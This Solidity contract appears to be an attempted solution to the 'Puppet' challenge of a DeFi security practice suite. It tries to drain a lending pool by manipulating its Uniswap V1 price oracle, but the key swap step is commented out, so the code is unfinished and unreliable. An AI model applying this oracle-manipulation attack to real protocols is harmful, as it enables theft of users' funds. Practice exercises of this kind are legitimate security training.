//SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../puppet/PuppetPool.sol";
import "../DamnValuableToken.sol";
import "./IUniswapExchange.sol";

// import "../../build-uniswap-v1/UniswapV1Exchange.json";

contract PuppetHack {
    DamnValuableToken public token;
    IUniswapExchange public exchange;
    PuppetPool public pool;
    uint256 player_initial_tokenBalance = 1000 ether;
    uint256 pool_initial_token_balance = 100000 ether;

    // uint256 _player_initial_tokenBalance,
    // uint256 _pool_initial_token_balance
    constructor(address _token, address _exchange, address _pool) payable {
        token = DamnValuableToken(_token);
        exchange = IUniswapExchange(_exchange);
        pool = PuppetPool(_pool);
        // player_initial_tokenBalance = _player_initial_tokenBalance;
        // pool_initial_token_balance = _pool_initial_token_balance;
        // experimental below
        // DamnValuableToken(_token).approve(
        //     address(IUniswapExchange(_exchange)),
        //     _player_initial_tokenBalance
        // );
        // // exchange.tokenToEthSwapInput(player_initial_tokenBalance, 1, block.timestamp + 5000);
        // IUniswapExchange(_exchange).tokenToEthSwapInput(
        //     _player_initial_tokenBalance,
        //     1,
        //     9999999999
        // );
        // uint256 deposit = PuppetPool(_pool).calculateDepositRequired(
        //     _player_initial_tokenBalance
        // );
        // PuppetPool(_pool).borrow{value: deposit, gas: 10000000}(
        //     _player_initial_tokenBalance,
        //     msg.sender
        // );
    }

    function attack() public {
        token.approve(address(exchange), player_initial_tokenBalance);
        // exchange.tokenToEthSwapInput(player_initial_tokenBalance, 1, block.timestamp + 5000);
        // exchange.tokenToEthSwapInput(
        //     player_initial_tokenBalance - 1,
        //     1,
        //     block.timestamp + 5000
        // );
        uint256 deposit = pool.calculateDepositRequired(
            player_initial_tokenBalance
        );
        pool.borrow{value: deposit, gas: 1000000}(
            pool_initial_token_balance,
            msg.sender
        );
    }

    receive() external payable {}
}
